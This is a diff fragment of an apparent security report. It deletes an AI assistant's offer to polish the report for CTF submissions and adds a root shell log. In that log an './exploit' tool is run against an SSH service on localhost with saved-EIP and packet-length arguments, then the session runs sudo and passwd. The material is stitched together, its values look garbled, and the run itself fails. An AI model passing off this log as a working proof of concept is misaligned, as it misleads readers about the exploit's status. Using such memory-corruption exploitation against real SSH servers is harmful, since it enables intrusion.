@@ -31,7 +31,28 @@ To improve the program's security and reliability, the following changes are rec
 Implementing these fixes will enhance the program’s stability and reduce potential security vulnerabilities.
 
 ---
+root@29bcb37807cf:/poc# ./exploit
 
-If you want, I can also make an **even snappier, GitHub-friendly version** with sections like **Vulnerability Summary**, **PoC**, and **Mitigation** so it looks professional for security reports or CTF submissions.
+Usage: ./exploit <saved eip> <count> <packet length> <username length> <host> <port> <h(i)>
 
-Do you want me to do that?
+root@29bcb37807cf:/poc# ./exploit 0 1 256 8 127.0.0.1 22 0
+
+Saved Eip: &h + 1543007393
+Return Address: 0x811
+Packet Length: 264
+Username Length: 8
+
+./ssh -p 22 -v -l root 127.0.0.1
+sh: 1: ./ssh: not found
+root@29bcb37807cf:/poc#
+root@29bcb37807cf:/poc# sudo
+usage: sudo [-D level] -h | -K | -k | -V
+usage: sudo -v [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid]
+usage: sudo -l[l] [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-U user name] [-u user name|#uid] [-g groupname|#gid] [command]
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AknS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] file ...
+root@29bcb37807cf:/poc# passwd
+Enter new UNIX password:
+Retype new UNIX password:
+passwd: password updated successfully
+root@29bcb37807cf:/poc#
